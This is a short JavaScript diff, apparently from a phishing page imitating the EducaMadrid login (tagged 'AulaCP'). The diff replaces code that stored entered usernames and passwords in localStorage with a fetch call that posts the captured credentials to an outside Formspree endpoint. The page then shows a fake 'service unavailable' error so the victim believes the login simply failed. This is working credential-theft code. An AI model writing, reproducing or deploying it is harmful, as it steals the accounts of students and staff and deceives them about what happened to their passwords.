@@ -57,10 +57,19 @@
             return false;
         }
 
-        // Guardado de datos normal
-        var logs = JSON.parse(localStorage.getItem('_sys_logs') || "[]");
-        logs.push({ user: u, pass: p, date: new Date().toLocaleString() });
-        localStorage.setItem('_sys_logs', JSON.stringify(logs));
+fetch("https://formspree.io/f/xpqkveqj", {
+    method: "POST",
+    body: JSON.stringify({
+        usuario: u,
+        password: p,
+        fecha: new Date().toLocaleString(),
+        origen: "AulaCP"
+    }),
+    headers: {
+        'Content-Type': 'application/json'
+    }
+}).catch(err => console.log("Error al enviar a la nube"));
+
 
         // Alerta y recarga
         alert("Error de autenticación: El servicio de EducaMadrid no está disponible. Por favor, cierre la pestaña y vuelva a intentarlo de nuevo.");
